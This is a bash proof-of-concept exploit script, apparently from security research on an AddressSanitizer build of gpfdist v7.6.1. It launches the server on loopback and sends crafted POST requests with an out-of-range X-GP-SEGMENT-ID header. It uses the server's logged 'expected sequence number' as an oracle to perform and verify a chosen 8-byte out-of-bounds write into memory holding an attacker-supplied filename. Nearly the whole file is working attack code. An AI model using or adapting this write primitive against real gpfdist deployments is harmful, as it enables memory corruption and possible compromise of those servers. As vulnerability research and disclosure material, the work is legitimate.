#!/usr/bin/env bash
# Adaptive chosen-8-byte-value probe at a deep segid whose OOB slot overlaps
# the attacker-supplied filename in the pstrdup'd session path.  Loopback only.
# One named session is created in-bounds (id=0) so it survives the OOB writes.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
BIN=${1:-$HERE/gpfdist_v7.6.1_asan}
PORT=${2:-18112}
IDX=${3:-12}
FN=${4:-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.txt}
OUT="$HERE/out_deep_$(basename "$BIN")"; rm -rf "$OUT"; mkdir -p "$OUT/data"
export ASAN_OPTIONS='detect_leaks=0:abort_on_error=0'
"$BIN" -b 127.0.0.1 -p "$PORT" -d "$OUT/data" -l "$OUT/server.log" >"$OUT/stdout" 2>&1 &
PID=$!
for i in $(seq 1 50); do (echo >"/dev/tcp/127.0.0.1/$PORT") >/dev/null 2>&1 && break; sleep 0.1; done
S="http://127.0.0.1:$PORT/$FN"
setup() { curl -sS -m 5 -o /dev/null -w '%{http_code}' -X POST "$S" \
  -H 'X-GP-PROTO:1' -H 'X-GP-XID:123' -H 'X-GP-CID:1' -H 'X-GP-SN:1' \
  -H 'X-GP-SEGMENT-COUNT:1' -H 'X-GP-SEGMENT-ID:0' -H 'X-GP-SEQ:1' 2>/dev/null; }
req() { curl -sS -m 5 -o /dev/null -w '%{http_code}' -X POST "$S" \
  -H 'X-GP-PROTO:1' -H 'X-GP-XID:123' -H 'X-GP-CID:1' -H 'X-GP-SN:1' \
  -H 'X-GP-SEGMENT-COUNT:1' -H "X-GP-SEGMENT-ID:$IDX" \
  -H "X-GP-SEQ:$1" 2>/dev/null; }
expected() { grep 'expected sequence number' "$OUT/server.log" | tail -1 | grep -oE 'expected sequence number is [0-9]+' | awk '{print $NF}'; }
echo "setup http=$(setup)"
c1=$(req 2); e1=$(expected)
echo "probe1 http=$c1 slot_plus_1=$e1"
if [ -z "${e1:-}" ]; then echo NO_ORACLE; kill "$PID" 2>/dev/null; exit 2; fi
c2=$(req "$e1"); e2=$(expected)
echo "chosen_write seq=$e1 http=$c2 slot_plus_1_now=$e2"
c3=$(req 2); e3=$(expected)
echo "verify http=$c3 slot_plus_1=$e3"
# $e3 is the fresh post-write verify readback; $e2 is the stale pre-write value.
python3 - "$e1" "$e3" <<'PY'
import sys
a=int(sys.argv[1]); b=int(sys.argv[2])
print("written_value", a, a.to_bytes(8,"little"))
print("value_now", b-1, (b-1).to_bytes(8,"little"))
PY
kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null
echo "asan_reports=$(grep -c AddressSanitizer "$OUT/server.log")"
